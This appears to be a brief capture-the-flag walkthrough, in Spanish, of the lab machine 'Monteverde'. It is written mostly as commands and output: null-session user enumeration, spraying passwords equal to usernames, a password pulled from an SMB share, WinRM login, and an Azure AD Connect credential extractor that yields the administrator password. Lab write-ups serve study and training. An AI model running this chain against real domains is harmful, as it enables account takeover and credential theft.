---
title: "Monteverde"
---

# Monteverde

```bash
rpcclient -U '' 10.10.10.172 -c "enumdomusers" -N | tr '[]' ' '| awk '{print $2}' > validUsers.txt
```

```bash
netexec smb 10.10.10.172 -u validUsers.txt  -p validUsers.txt  -d megabank.local --continue-on-success --no-bruteforce
```

```
SABatchJobs \ SABatchJobs 
```

```bash
smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'
```

```bash
smbclient //10.10.10.172/azure_uploads -U SABatchJobs%SABatchJobs
```

```bash
smbclient //10.10.10.172/users\$ -U SABatchJobs%SABatchJobs

get azure.xml
```

```
4n0therD4y@n0th3r$
```

```bash
netexec smb 10.10.10.172 -u validUsers.txt  -p '4n0therD4y@n0th3r$'  -d megabank.local --continue-on-success
```

```
mhope \ 4n0therD4y@n0th3r$
```

```bash
evil-winrm -i 10.10.10.172 -u 'mhope'  -p '4n0therD4y@n0th3r$'
```

Como somos azure admins , podemos extraer las credenciales de todo el Azure AD
 
https://github.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor.git

```bash
upload /mnt/Windows/Hacking/tools/EntraID/Azure-AD-Connect-Credential-Extractor/decrypt.ps1
```

```powershell
./decrypt.ps1
```

```
administrator \ d0m@in4dminyeah!
```
